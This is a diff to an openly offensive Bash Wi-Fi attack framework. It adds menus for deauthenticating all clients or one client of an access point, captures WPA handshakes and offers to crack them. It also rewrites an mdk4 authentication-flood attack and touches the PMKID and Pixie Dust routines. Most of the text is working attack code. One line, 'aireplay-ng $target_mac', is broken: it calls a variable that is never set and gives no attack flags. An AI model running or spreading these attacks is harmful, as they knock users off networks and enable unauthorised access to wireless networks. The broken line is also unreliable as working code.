@@ -300,6 +300,10 @@ function ask_mac(){
 	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] MAC address of the AP: ${endColour}" && read ap_mac
 }
 
+function ask_mac2(){
+	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] MAC address of the client: ${endColour}" && read client_mac
+}
+
 # Time Function
 function ask_time(){
 	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Duration of the attack: ${endColour}" && read attack_time
@@ -399,31 +403,24 @@ function report-gen(){
 	echo -e "---------------------------------" >> /opt/WEF/main/captures/$name/log.txt
 }
 
-# Deauthentication Attack
-function deauth_attack(){
-	clear
-	banner1
+# Deauth all clients
+function deauth_all_clients(){
 	sleep 1
-	xterm -hold -e "airodump-ng ${netCard}mon" &
-	# wash -2 -5 -a -i $netCard
-	air_PID=$!
-	ask_data1
-	ask_time
-	kill -9 $air_PID
-	wait $air_PID 2>/dev/null
+	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to catch the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read catch_handshakes
 
-	sleep 1.3
-	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
-	xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon" &
-	air2_PID=$!
-
-	sleep 2.5
+	if [ "$catch_handshakes" == "y" ]; then
+		xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon" &
+		air2_PID=$!
+	fi
+	
 	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Deauthentication attack...${endColour}"
 	aireplay-ng -0 10 -e $name -c FF:FF:FF:FF:FF:FF ${netCard}mon &>/dev/null
 
-	kill -9 $air2_PID
-	wait $air2_PID 2>/dev/null
-
+	if [ "$catch_handshakes" == "y" ]; then
+		kill -9 $air2_PID
+		wait $air2_PID 2>/dev/null
+	fi
+	
 	mkdir /opt/WEF/main/captures/$name
 	cp Capture-* /opt/WEF/main/captures/$name/
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
@@ -441,6 +438,73 @@ function deauth_attack(){
 	fi
 }
 
+# Deauth one client
+function deauth_one_client(){
+	sleep 1
+	echo -ne "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to catch the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read catch_handshakes
+	
+	if [ "$catch_handshakes" == "y" ]; then
+		xterm -hold -e "airodump-ng -c $channel -w ${dir}/Capture --essid $name ${netCard}mon" &
+		air2_PID=$!
+	fi	
+
+	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Deauthentication attack...${endColour}"
+	aireplay-ng $target_mac
+	
+	if [ "$catch_handshakes" == "y" ]; then
+		kill -9 $air2_PID
+		wait $air2_PID 2>/dev/null
+	fi
+	
+	mkdir /opt/WEF/main/captures/$name
+	cp Capture-* /opt/WEF/main/captures/$name/
+	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Attack completed${endColour}"
+	sleep 0.1
+	report-gen
+	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
+	sleep 0.3
+	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Do you want to crack the handshakes? [${endColour}${yellowColour}y${endColour}${blueColour}/${endColour}${yellowColour}n${endColour}${blueColour}]: ${endColour}" && read crack_option
+	sleep 0.2
+
+	if [ "$crack_option" == "y" ]; then
+		handshake_crack
+	else
+		ctrl_c
+	fi
+}
+
+# Deauthentication Function
+function deauth_attack(){
+	clear
+	banner1
+	sleep 0.5
+	
+	echo -e "\n${blueColour}[${endColour}${yellowColour}1${endColour}${blueColour}] Deauthenticate all clients${endColour}"
+	echo -e "\n${blueColour}[${endColour}${yellowColour}2${endColour}${blueColour}] Deauthenticate one client${endColour}"
+	sleep 0.1
+	echo -ne "${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Choose an option --> ${endColour}" && read deauth_option
+
+	xterm -hold -e "airodump-ng ${netCard}mon" &
+	# wash -2 -5 -a -i $netCard
+	air_PID=$!
+	
+	ask_data1
+	if [ "$deauth_option" == "2" ]; then
+		ask_mac2
+	fi
+	
+	kill -9 $air_PID
+	wait $air_PID 2>/dev/null
+
+	actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
+
+	if [ "$deauth_option" == "1" ]; then
+		deauth_all_clients
+	elif [ "$deauth_option" == "2" ]; then
+		deauth_one_client
+	fi
+}
+
 # PKMID Cracking
 function pkmid_crack(){
 	test -f pkmid_hashes
@@ -455,7 +519,7 @@ function pkmid_crack(){
 		sleep 1
 		keep_exit
 	else
-		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Handshakes file not found${endColour}\n"
+		echo -e "\n${blueColour}[${endColour}${redColour}X${endColour}${blueColour}] Handshakes file not found${endColour}"
 		ctrl_c
 	fi
 }
@@ -469,6 +533,7 @@ function auth_attack(){
 	air_PID=$!
 
 	ask_data1
+	ask_mac
 	ask_time
 
 	mkdir /opt/WEF/main/captures/$name 2>/dev/null
@@ -480,12 +545,11 @@ function auth_attack(){
 	air2_PID=$!
 
 	echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Starting Authentication attack...${endColour}"
-	xterm -hold -e "mdk4 -a" &
-	aireplay_PID=$!
-	sleep "${attack_time}"
-	kill -9 ${aireplay_PID}; wait ${aireplay_PID} 2>/dev/null
+	mdk4 a -a $ap_mac &>/dev/null
+
 	sleep 0.1
 	kill -9 $air2_PID; wait $air2_PID 2>/dev/null
+	
 	report-gen
 	cp Capture-* /opt/WEF/main/captures/$name/
 	echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Logs stored in: /opt/WEF/main/captures/$name/${endColour}"
@@ -637,6 +701,7 @@ function pixie_dust(){
 	sleep 0.3
 	xterm -hold -e "airodump-ng ${netCard}mon" &
 	air_PID=$!
+	
 	ask_mac
 	ask_data2
 	kill -9 $air_PID; wait $air_PID 2>/dev/null
